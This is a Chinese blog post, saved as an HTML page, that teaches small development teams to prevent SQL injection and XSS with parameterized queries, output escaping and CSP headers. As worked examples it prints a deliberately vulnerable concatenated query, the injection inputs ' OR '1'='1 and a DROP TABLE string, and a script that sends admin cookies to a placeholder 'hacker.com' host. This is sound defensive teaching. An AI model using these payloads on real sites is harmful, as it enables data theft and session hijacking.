@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="还记得两年前的一个凌晨三点，我的手机像疯了一样震动。\n电话那头是运维老张，声音都在抖：“老李，咱们后台管理系统的首页被人挂了赌博广告，而且用户表刚才被批量导出了……”\n我当时脑子“嗡”的一下，那是个刚上线不久的内部运营工具，大家都在赶进度，想着“反正是内网用，不用太讲究”。结果，就因为一个实习生为了省事，在搜索框里写了一句原生的SQL拼接，整个数据库差点被人连锅端。\n哪怕是内网项目，也不能裸奔。 这就是我今天要和大家聊的：在资源有限的中小团队，如何用最低的成本，堵住SQL注入和XSS这两个最大的窟窿。\n这种“省事”的代码，就是定时炸弹\r咱们先说SQL注入。很多刚入行的兄弟，或者赶工期的老手，特别喜欢用字符串拼接来拼凑SQL语句。觉得直观、快。\n但我亲眼见过一个真实的惨案。\n那是我们给一家电商做的小程序后端。有个“按商品名称搜索”的功能。代码大概长这样：\n-- 典型的找死写法 String sql = &#34;SELECT * FROM products WHERE name = &#39;&#34; + userName + &#34;&#39;&#34;; 开发小哥觉得没问题啊，用户输入“苹果”，查出来的就是苹果。\n直到有一天，有个竞争对手搞事情，在搜索框里输入了这么一串东西： ' OR '1'='1\n这句SQL瞬间变成了： SELECT * FROM products WHERE name = '' OR '1'='1'\n因为 1=1 永远成立，数据库把所有商品信息一股脑全吐了出来。更可怕的是，如果对方输入的是 ; DROP TABLE products; --，那你第二天上班可能就得准备简历了。\n怎么防？其实就一招：参数化查询（预编译）。\n别去搞什么复杂的正则过滤，也别试图自己写函数去清洗关键词，你玩不过黑客的。直接交给数据库驱动去处理。\n我就强制要求团队里所有涉及数据库操作的地方，必须用占位符。比如在Java里用 PreparedStatement，或者如果你用MyBatis/MyBatis-Plus，确保你用的是 #{} 而不是 ${}。\n// 正确姿势 String sql = &#34;SELECT * FROM products WHERE name = ?&#34;; PreparedStatement pstmt = connection.prepareStatement(sql); pstmt.setString(1, userName); 这么做的原理很简单：数据库会先把SQL语句的骨架编译好，把用户输入的内容仅仅当作“数据”填进去，而不是当作“命令”执行。不管用户输入多离谱的代码，它都只是一串普通的字符串。\n小思考：你现在的项目里，不管是MyBatis还是JPA，有没有那种为了实现动态排序，偷偷用了 ${} 或者直接拼接字符串的地方？赶紧去搜一下全局代码。\n">
+<title>别等库被删才哭：中小团队防SQL注入与XSS实战</title>
+
+<link rel='canonical' href='https://blog.irudder.me/tech/zhongxiaoxingxiangmujiagoushejizhinan/anquanxingsheji_fangzhisqlzhuruyuxssgongji.html'>
+
+<link rel="stylesheet" href="/scss/style.min.b9e9128fec450ebccecc4ec9900157f32b85d0609bcd5ee3293968bcaa1235f2.css"><meta property='og:title' content="别等库被删才哭：中小团队防SQL注入与XSS实战">
+<meta property='og:description' content="还记得两年前的一个凌晨三点，我的手机像疯了一样震动。\n电话那头是运维老张，声音都在抖：“老李，咱们后台管理系统的首页被人挂了赌博广告，而且用户表刚才被批量导出了……”\n我当时脑子“嗡”的一下，那是个刚上线不久的内部运营工具，大家都在赶进度，想着“反正是内网用，不用太讲究”。结果，就因为一个实习生为了省事，在搜索框里写了一句原生的SQL拼接，整个数据库差点被人连锅端。\n哪怕是内网项目，也不能裸奔。 这就是我今天要和大家聊的：在资源有限的中小团队，如何用最低的成本，堵住SQL注入和XSS这两个最大的窟窿。\n这种“省事”的代码，就是定时炸弹\r咱们先说SQL注入。很多刚入行的兄弟，或者赶工期的老手，特别喜欢用字符串拼接来拼凑SQL语句。觉得直观、快。\n但我亲眼见过一个真实的惨案。\n那是我们给一家电商做的小程序后端。有个“按商品名称搜索”的功能。代码大概长这样：\n-- 典型的找死写法 String sql = &#34;SELECT * FROM products WHERE name = &#39;&#34; + userName + &#34;&#39;&#34;; 开发小哥觉得没问题啊，用户输入“苹果”，查出来的就是苹果。\n直到有一天，有个竞争对手搞事情，在搜索框里输入了这么一串东西： ' OR '1'='1\n这句SQL瞬间变成了： SELECT * FROM products WHERE name = '' OR '1'='1'\n因为 1=1 永远成立，数据库把所有商品信息一股脑全吐了出来。更可怕的是，如果对方输入的是 ; DROP TABLE products; --，那你第二天上班可能就得准备简历了。\n怎么防？其实就一招：参数化查询（预编译）。\n别去搞什么复杂的正则过滤，也别试图自己写函数去清洗关键词，你玩不过黑客的。直接交给数据库驱动去处理。\n我就强制要求团队里所有涉及数据库操作的地方，必须用占位符。比如在Java里用 PreparedStatement，或者如果你用MyBatis/MyBatis-Plus，确保你用的是 #{} 而不是 ${}。\n// 正确姿势 String sql = &#34;SELECT * FROM products WHERE name = ?&#34;; PreparedStatement pstmt = connection.prepareStatement(sql); pstmt.setString(1, userName); 这么做的原理很简单：数据库会先把SQL语句的骨架编译好，把用户输入的内容仅仅当作“数据”填进去，而不是当作“命令”执行。不管用户输入多离谱的代码，它都只是一串普通的字符串。\n小思考：你现在的项目里，不管是MyBatis还是JPA，有没有那种为了实现动态排序，偷偷用了 ${} 或者直接拼接字符串的地方？赶紧去搜一下全局代码。\n">
+<meta property='og:url' content='https://blog.irudder.me/tech/zhongxiaoxingxiangmujiagoushejizhinan/anquanxingsheji_fangzhisqlzhuruyuxssgongji.html'>
+<meta property='og:site_name' content='SelfTechHub'>
+<meta property='og:type' content='article'><meta property='article:section' content='Tech' /><meta property='article:tag' content='安全性设计：防止SQL注入与XSS攻击' /><meta property='article:published_time' content='2022-08-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-08-02T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="别等库被删才哭：中小团队防SQL注入与XSS实战">
+<meta name="twitter:description" content="还记得两年前的一个凌晨三点，我的手机像疯了一样震动。\n电话那头是运维老张，声音都在抖：“老李，咱们后台管理系统的首页被人挂了赌博广告，而且用户表刚才被批量导出了……”\n我当时脑子“嗡”的一下，那是个刚上线不久的内部运营工具，大家都在赶进度，想着“反正是内网用，不用太讲究”。结果，就因为一个实习生为了省事，在搜索框里写了一句原生的SQL拼接，整个数据库差点被人连锅端。\n哪怕是内网项目，也不能裸奔。 这就是我今天要和大家聊的：在资源有限的中小团队，如何用最低的成本，堵住SQL注入和XSS这两个最大的窟窿。\n这种“省事”的代码，就是定时炸弹\r咱们先说SQL注入。很多刚入行的兄弟，或者赶工期的老手，特别喜欢用字符串拼接来拼凑SQL语句。觉得直观、快。\n但我亲眼见过一个真实的惨案。\n那是我们给一家电商做的小程序后端。有个“按商品名称搜索”的功能。代码大概长这样：\n-- 典型的找死写法 String sql = &#34;SELECT * FROM products WHERE name = &#39;&#34; + userName + &#34;&#39;&#34;; 开发小哥觉得没问题啊，用户输入“苹果”，查出来的就是苹果。\n直到有一天，有个竞争对手搞事情，在搜索框里输入了这么一串东西： ' OR '1'='1\n这句SQL瞬间变成了： SELECT * FROM products WHERE name = '' OR '1'='1'\n因为 1=1 永远成立，数据库把所有商品信息一股脑全吐了出来。更可怕的是，如果对方输入的是 ; DROP TABLE products; --，那你第二天上班可能就得准备简历了。\n怎么防？其实就一招：参数化查询（预编译）。\n别去搞什么复杂的正则过滤，也别试图自己写函数去清洗关键词，你玩不过黑客的。直接交给数据库驱动去处理。\n我就强制要求团队里所有涉及数据库操作的地方，必须用占位符。比如在Java里用 PreparedStatement，或者如果你用MyBatis/MyBatis-Plus，确保你用的是 #{} 而不是 ${}。\n// 正确姿势 String sql = &#34;SELECT * FROM products WHERE name = ?&#34;; PreparedStatement pstmt = connection.prepareStatement(sql); pstmt.setString(1, userName); 这么做的原理很简单：数据库会先把SQL语句的骨架编译好，把用户输入的内容仅仅当作“数据”填进去，而不是当作“命令”执行。不管用户输入多离谱的代码，它都只是一串普通的字符串。\n小思考：你现在的项目里，不管是MyBatis还是JPA，有没有那种为了实现动态排序，偷偷用了 ${} 或者直接拼接字符串的地方？赶紧去搜一下全局代码。\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8588ce14af1147e2.png" width="300"
+                            height="286" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">SelfTechHub</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%8A%80%E6%9C%AF.html" >
+                技术精进
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/tech/zhongxiaoxingxiangmujiagoushejizhinan/anquanxingsheji_fangzhisqlzhuruyuxssgongji.html">别等库被删才哭：中小团队防SQL注入与XSS实战</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2022-08-02T00:00:00Z'>Aug 02, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>还记得两年前的一个凌晨三点，我的手机像疯了一样震动。</p>
+<p>电话那头是运维老张，声音都在抖：“老李，咱们后台管理系统的首页被人挂了赌博广告，而且用户表刚才被批量导出了……”</p>
+<p>我当时脑子“嗡”的一下，那是个刚上线不久的内部运营工具，大家都在赶进度，想着“反正是内网用，不用太讲究”。结果，就因为一个实习生为了省事，在搜索框里写了一句原生的SQL拼接，整个数据库差点被人连锅端。</p>
+<p><img src="https://picsum.photos/800/450?random=1768456084481"
+	
+	
+	
+	loading="lazy"
+	
+		alt="配图"
+	
+	
+></p>
+<p><strong>哪怕是内网项目，也不能裸奔。</strong> 这就是我今天要和大家聊的：在资源有限的中小团队，如何用最低的成本，堵住SQL注入和XSS这两个最大的窟窿。</p>
+<h2 id="这种省事的代码就是定时炸弹">这种“省事”的代码，就是定时炸弹
+</h2><p>咱们先说SQL注入。很多刚入行的兄弟，或者赶工期的老手，特别喜欢用字符串拼接来拼凑SQL语句。觉得直观、快。</p>
+<p>但我亲眼见过一个真实的惨案。</p>
+<p>那是我们给一家电商做的小程序后端。有个“按商品名称搜索”的功能。代码大概长这样：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 典型的找死写法
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>String <span style="color:#66d9ef">sql</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM products WHERE name = &#39;&#34;</span> <span style="color:#f92672">+</span> userName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>;
+</span></span></code></pre></div><p>开发小哥觉得没问题啊，用户输入“苹果”，查出来的就是苹果。</p>
+<p>直到有一天，有个竞争对手搞事情，在搜索框里输入了这么一串东西：
+<code>' OR '1'='1</code></p>
+<p>这句SQL瞬间变成了：
+<code>SELECT * FROM products WHERE name = '' OR '1'='1'</code></p>
+<p>因为 <code>1=1</code> 永远成立，数据库把所有商品信息一股脑全吐了出来。更可怕的是，如果对方输入的是 <code>; DROP TABLE products; --</code>，那你第二天上班可能就得准备简历了。</p>
+<p><strong>怎么防？其实就一招：参数化查询（预编译）。</strong></p>
+<p>别去搞什么复杂的正则过滤，也别试图自己写函数去清洗关键词，你玩不过黑客的。直接交给数据库驱动去处理。</p>
+<p>我就强制要求团队里所有涉及数据库操作的地方，必须用占位符。比如在Java里用 <code>PreparedStatement</code>，或者如果你用MyBatis/MyBatis-Plus，确保你用的是 <code>#{}</code> 而不是 <code>${}</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 正确姿势</span>
+</span></span><span style="display:flex;"><span>String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM products WHERE name = ?&#34;</span>;
+</span></span><span style="display:flex;"><span>PreparedStatement pstmt <span style="color:#f92672">=</span> connection.<span style="color:#a6e22e">prepareStatement</span>(sql);
+</span></span><span style="display:flex;"><span>pstmt.<span style="color:#a6e22e">setString</span>(1, userName);
+</span></span></code></pre></div><p><strong>这么做的原理很简单</strong>：数据库会先把SQL语句的骨架编译好，把用户输入的内容仅仅当作“数据”填进去，而不是当作“命令”执行。不管用户输入多离谱的代码，它都只是一串普通的字符串。</p>
+<blockquote>
+<p><strong>小思考</strong>：你现在的项目里，不管是MyBatis还是JPA，有没有那种为了实现动态排序，偷偷用了 <code>${}</code> 或者直接拼接字符串的地方？赶紧去搜一下全局代码。</p>
+</blockquote>
+<h2 id="那些看不见的脚本专偷管理员cookie">那些“看不见”的脚本，专偷管理员Cookie
+</h2><p>聊完后端，再聊聊前端最头疼的XSS（跨站脚本攻击）。</p>
+<p>很多人觉得 XSS 离自己很远，其实它就在你身边。</p>
+<p>去年我接手过一个烂尾项目，是个论坛系统。有个用户发了个帖子，标题看起来很正常，但只要管理员一点进去审核，后台就会莫名其妙地卡顿一下。</p>
+<p>后来复盘发现，那个标题里藏了一段隐形的 JavaScript 代码：
+<code>&lt;script&gt;fetch('http://hacker.com?cookie='+document.cookie)&lt;/script&gt;</code></p>
+<p>因为系统没有对输出内容做转义，这段代码在管理员的浏览器里直接执行了。管理员的 Session ID 被发送到了黑客的服务器。黑客拿着这个 ID，直接伪装成管理员登录后台，把所有帖子都删了。</p>
+<p>这就是典型的<strong>存储型 XSS</strong>。</p>
+<p>很多开发同学有个误区：<strong>“我在前端输入框限制了只能输入中文和数字，不就安全了吗？”</strong></p>
+<p><strong>大错特错。</strong> 攻击者完全可以绕过浏览器，直接用 Postman 给你的后端接口发请求。</p>
+<p><strong>防 XSS 的核心逻辑是：永远不信任用户的输入，并且在输出时进行编码。</strong></p>
+<p>针对中小团队，我有两个落地的建议：</p>
+<ol>
+<li>
+<p><strong>输入过滤不如输出转义</strong>：
+虽然可以在入库前清洗数据（比如用 <code>OWASP Java Encoder</code>），但更容易踩坑。最稳妥的是在数据展示到页面上时，进行 HTML 转义。把 <code>&lt;</code> 变成 <code>&amp;lt;</code>，把 <code>&gt;</code> 变成 <code>&amp;gt;</code>。</p>
+<p>好消息是，现代前端框架（Vue, React, Angular）默认都自带了转义功能。
+<strong>但也别大意</strong>，比如 Vue 里的 <code>v-html</code> 或者 React 里的 <code>dangerouslySetInnerHTML</code>，这俩就是给 XSS 开的后门。除非万不得已（比如渲染富文本编辑器内容），<strong>千万别用</strong>。</p>
+</li>
+</ol>
+<p><img src="https://picsum.photos/800/450?random=1768456086339"
+	
+	
+	
+	loading="lazy"
+	
+		alt="配图"
+	
+	
+></p>
+<ol start="2">
+<li>
+<p><strong>给浏览器穿防弹衣：CSP（内容安全策略）</strong>
+这是个被很多人忽略的神器。只需要在 HTTP 响应头里加一行配置，就能告诉浏览器：<strong>“只许执行我指定域名的脚本，其他的一律拦截。”</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://trusted.cdn.com;
+</span></span></span></code></pre></div><p>我就遇到过一次，因为配置了 CSP，攻击者注入的脚本虽然在页面上了，但浏览器直接拒绝执行，控制台报了个红错，完美拦截。</p>
+</li>
+</ol>
+<h2 id="安全不是一次性的是种习惯">安全不是一次性的，是种习惯
+</h2><p>我在带团队的时候，每周五下午的代码走查（Code Review）环节，都会专门盯着这两点看。</p>
+<p>时间久了，大家就形成了肌肉记忆：</p>
+<ul>
+<li>看到 SQL 拼接，下意识就会改成占位符；</li>
+<li>看到 <code>v-html</code>，下意识就会问一句“这里过滤了吗？”</li>
+</ul>
+<p>对于咱们中小团队架构师来说，不需要去买几十万的防火墙，先把代码层面的这两个低级漏洞堵住，就能挡住 90% 的脚本小子。</p>
+<p>千万别觉得“我的系统没人这没价值，没人攻击”。在网络世界里，很多攻击都是全网扫描的自动化脚本，它不管你是谁，扫到漏洞就搞你一下。</p>
+<p><strong>最后，我想请大家做个小复盘：</strong></p>
+<p>回顾一下你最近写的一个功能，如果是“评论”或者“搜索”模块，你敢保证把 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 输入进去，页面不会弹窗吗？</p>
+<p><strong>落地行动指南：</strong></p>
+<ol>
+<li><strong>全局搜索</strong>：立刻在你的项目里搜索 <code>$</code>（如果是MyBatis）或者 <code>+</code>（如果是拼接SQL），排查有没有裸露的拼接。</li>
+<li><strong>开启 CSP</strong>：如果你的项目是 Web 端，尝试在 Nginx 或者后端代码里加上基础的 CSP 头，先开个 Report-Only 模式看看有多少违规脚本。</li>
+<li><strong>慎用富文本</strong>：如果业务必须用富文本编辑器，后端必须引入 <code>DOMPurify</code> (JS) 或 <code>Jsoup</code> (Java) 之类的库进行白名单过滤，<strong>绝对不能</strong>原样存取。</li>
+</ol>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%AE%89%E5%85%A8%E6%80%A7%E8%AE%BE%E8%AE%A1%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%E4%B8%8EXSS%E6%94%BB%E5%87%BB.html">安全性设计：防止SQL注入与XSS攻击</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="pastor17/bloggiscus"
+    data-repo-id="R_kgDOQ6H9qQ"
+    data-category=""
+    data-category-id="DIC_kwDOQ6H9qc4C0-T8"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="light"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('light');
+            } else {
+                setGiscusTheme('dark_dimmed');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 SelfTechHub
+    </section>
+    
+    <section class="powerby">
+        
+
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+    
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
